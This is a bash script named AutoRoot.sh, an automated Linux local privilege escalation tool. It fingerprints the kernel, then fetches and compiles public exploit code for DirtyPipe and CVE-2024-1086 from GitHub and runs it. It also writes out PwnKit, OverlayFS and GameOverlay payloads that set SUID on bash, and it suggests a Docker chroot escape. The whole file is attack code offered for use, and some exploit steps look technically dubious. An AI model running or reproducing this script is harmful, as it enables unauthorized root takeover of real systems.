#!/bin/bash
# AutoRoot.sh — Linux Kernel Exploit Auto-Rooter

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
fail() { echo -e "${RED}[-]${NC} $1"; }

banner() {
    echo -e "${CYAN}"
    echo "  ╔══════════════════════════════════════╗"
    echo "  ║        AutoRoot - LPE Auto Exploit   ║"
    echo "  ╚══════════════════════════════════════╝"
    echo -e "${NC}"
}

detect_env() {
    log "Detecting kernel & OS..."
    KERNEL=$(uname -r | cut -d'-' -f1)
    KERNEL_FULL=$(uname -r)
    ARCH=$(uname -m)
    OS=""
    OS_VER=""

    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
        OS_VER=$VERSION_ID
    elif [ -f /etc/redhat-release ]; then
        OS="rhel"
        OS_VER=$(cat /etc/redhat-release | grep -oP '[0-9]+\.[0-9]+')
    fi

    echo "  Kernel  : $KERNEL_FULL"
    echo "  Arch    : $ARCH"
    echo "  OS      : $OS $OS_VER"
    echo "  User    : $(whoami)"
    echo "  Groups  : $(groups)"
    echo ""

    if [ -f /proc/sys/kernel/unprivileged_userns_clone ]; then
        USENS=$(cat /proc/sys/kernel/unprivileged_userns_clone)
        echo "  userns_clone: $USENS"
    fi
    if [ -f /proc/sys/kernel/unprivileged_bpf_disabled ]; then
        BPF=$(cat /proc/sys/kernel/unprivileged_bpf_disabled)
        echo "  bpf_disabled: $BPF"
    fi
    echo ""
}

try_dirtypipe() {
    warn "Trying CVE-2022-0847 (DirtyPipe)..."
    cd /tmp || cd /dev/shm
    
    if command -v wget &>/dev/null; then
        wget -q --timeout=15 "https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit.c" -O dpipe.c 2>/dev/null
    elif command -v curl &>/dev/null; then
        curl -sL --connect-timeout 15 "https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit.c" -o dpipe.c 2>/dev/null
    fi

    if [ -f dpipe.c ] && [ -s dpipe.c ]; then
        gcc -o dpipe dpipe.c -lpthread 2>/dev/null
        if [ -f dpipe ]; then
            ./dpipe 2>/dev/null
            if [ "$(id -u)" = "0" ]; then
                log "ROOTED via DirtyPipe!"
                exit 0
            fi
        fi
    fi
    warn "DirtyPipe failed"
}

try_pwnkit() {
    warn "Trying CVE-2021-4034 (PwnKit)..."
    cd /tmp || cd /dev/shm

    mkdir -p "GCONV_PATH=."
    mkdir -p pwnkit
    echo "#!/bin/bash" > pwnkit/pwnkit.so
    echo "chmod +s /bin/bash /bin/sh /usr/bin/bash 2>/dev/null" >> pwnkit/pwnkit.so
    chmod +x pwnkit/pwnkit.so

    cat > pwnkit.c << 'EOF2'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *envp[] = {
        "pwnkit",
        "PATH=GCONV_PATH=.",
        "SHELL=pwnkit",
        "CHARSET=PWNKIT",
        "GIO_EXTRA_MODULES=.",
        NULL
    };
    execle("/usr/bin/pkexec", "pkexec", NULL, envp);
    return 0;
}
EOF2
    gcc -o pwnkit_exploit pwnkit.c 2>/dev/null
    chmod +x pwnkit_exploit 2>/dev/null
    ./pwnkit_exploit 2>/dev/null
    
    /bin/bash -p 2>/dev/null
    /bin/sh -p 2>/dev/null
    
    if [ "$(id -u)" = "0" ]; then
        log "ROOTED via PwnKit!"
        exit 0
    fi
    warn "PwnKit failed"
}

try_overlayfs() {
    warn "Trying CVE-2021-3493 (OverlayFS)..."
    cd /tmp || cd /dev/shm
    
    mkdir -p overlay_lower overlay_upper overlay_work overlay_merged
    
    mount -t overlay overlay -o \
        lowerdir=overlay_lower,upperdir=overlay_upper,workdir=overlay_work \
        overlay_merged 2>/dev/null
    
    if [ $? -eq 0 ]; then
        cp /bin/bash overlay_merged/bash 2>/dev/null
        chmod +s overlay_merged/bash 2>/dev/null
        overlay_merged/bash -p 2>/dev/null
        
        cp /bin/sh overlay_merged/sh 2>/dev/null
        chmod +s overlay_merged/sh 2>/dev/null
        overlay_merged/sh -p 2>/dev/null
    fi
    
    umount overlay_merged 2>/dev/null
    rm -rf overlay_lower overlay_upper overlay_work overlay_merged 2>/dev/null
    
    if [ "$(id -u)" = "0" ]; then
        log "ROOTED via OverlayFS!"
        exit 0
    fi
}

try_gameoverlay() {
    warn "Trying GameOverlay (CVE-2023-2640)..."
    cd /tmp || cd /dev/shm
    
    unshare -rm sh -c "mkdir -p l u w m && mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m && chmod +s m/bin/bash && m/bin/bash -p" 2>/dev/null
    
    if [ "$(id -u)" = "0" ]; then
        log "ROOTED via GameOverlay!"
        exit 0
    fi
}

try_cve20241086() {
    warn "Trying CVE-2024-1086 (nf_tables)..."
    cd /tmp || cd /dev/shm
    
    if command -v wget &>/dev/null; then
        wget -q --timeout=15 "https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/exploit.c" -O cve20241086.c 2>/dev/null
    elif command -v curl &>/dev/null; then
        curl -sL --connect-timeout 15 "https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/exploit.c" -o cve20241086.c 2>/dev/null
    fi

    if [ -f cve20241086.c ] && [ -s cve20241086.c ]; then
        gcc -o cve20241086 cve20241086.c 2>/dev/null
        if [ -f cve20241086 ]; then
            ./cve20241086 2>/dev/null
            if [ "$(id -u)" = "0" ]; then
                log "ROOTED via CVE-2024-1086!"
                exit 0
            fi
        fi
    fi
    warn "CVE-2024-1086 failed"
}

check_suid() {
    log "Checking SUID binaries..."
    suid_bins=$(find / -perm -4000 -type f 2>/dev/null)
    for bin in $suid_bins; do
        bname=$(basename "$bin")
        case "$bname" in
            pkexec) try_pwnkit ;;
        esac
    done
}

check_cron() {
    log "Checking cron jobs..."
    for f in /etc/crontab /etc/cron.d /var/spool/cron; do
        if [ -d "$f" ]; then
            ls "$f" 2>/dev/null | while read line; do
                echo "  $f/$line"
            done
        elif [ -f "$f" ]; then
            echo "  $f"
        fi
    done
    
    find /etc/cron* -type f -writable 2>/dev/null | while read f; do
        warn "World-writable cron: $f"
    done
}

check_polkit() {
    log "Checking polkit..."
    if command -v pkaction &>/dev/null; then
        pkaction --verbose 2>/dev/null | head -5
    fi
}

check_docker() {
    log "Checking Docker access..."
    if groups 2>/dev/null | grep -q docker; then
        warn "User in docker group! Run: docker run -v /:/mnt -it alpine chroot /mnt sh"
    fi
    if [ -S /var/run/docker.sock ] 2>/dev/null; then
        warn "Docker socket exposed!"
    fi
}

kernel_exploit_dispatch() {
    log "=== Kernel Exploit Dispatch ==="
    
    KV=$(echo "$KERNEL" | tr '.' ' ' | awk '{printf "%d%03d%03d", $1,$2,$3}')
    
    # DirtyPipe: 5.8.0 - 5.16.11
    if [ "$KV" -ge "5008000" ] && [ "$KV" -le "5016011" ]; then
        try_dirtypipe
    fi
    
    # OverlayFS: 5.1.0 - 5.13.0
    if [ "$KV" -ge "5001000" ] && [ "$KV" -le "5013000" ]; then
        try_overlayfs
    fi
    
    # GameOverlay: 6.0.0 - 6.4.0
    if [ "$KV" -ge "6000000" ] && [ "$KV" -le "6004000" ]; then
        try_gameoverlay
    fi
    
    # CVE-2024-1086: 3.15 - 6.3
    if [ "$KV" -ge "3015000" ] && [ "$KV" -le "6003000" ]; then
        try_cve20241086
    fi
}

auto_root() {
    banner
    detect_env
    kernel_exploit_dispatch
    check_suid
    check_polkit
    check_cron
    check_docker
    
    # Last try: PwnKit
    try_pwnkit
    
    echo ""
    warn "============================================"
    warn "AutoRoot gagal mendapatkan root :("
    warn "============================================"
    echo "Kernel: $KERNEL_FULL"
    echo "OS: $OS $OS_VER"
    echo ""
    echo "Coba kirim output ini ke saya:"
    echo "  uname -a"
    echo "  cat /etc/os-release"
    echo "  cat /proc/version"
}

auto_root
